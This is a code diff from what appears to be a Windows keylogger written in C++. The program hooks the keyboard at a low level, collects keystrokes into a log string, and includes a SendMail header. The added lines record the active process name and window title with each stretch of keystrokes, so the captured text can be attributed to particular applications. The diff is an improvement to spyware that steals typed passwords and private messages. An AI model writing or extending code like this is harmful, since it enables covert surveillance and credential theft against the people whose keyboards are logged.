@@ -7,6 +7,7 @@
 #include "KeyConstants.h"
 #include "Timer.h"
 #include "SendMail.h"
+#include "Process.h"
 
 std::string keylog = "";
 
@@ -37,6 +38,18 @@ HHOOK eHook = NULL;
 
 LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 {
+    GetProcID();
+    EnumWindows(EnumWindowsProc,0);
+    if (curprocname != GetProcName(curpid))
+    {
+        curprocname = GetProcName(curpid);
+    }
+    if (std::string(wnd_title) != curproctitle)
+    {
+        curproctitle = std::string(wnd_title);
+        keylog.clear();
+        keylog += "\n<" + curprocname + "> - " + "[" + curproctitle + "] : ";
+    }
     if(nCode < 0)
         CallNextHookEx(eHook, nCode, wparam, lparam);
     KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
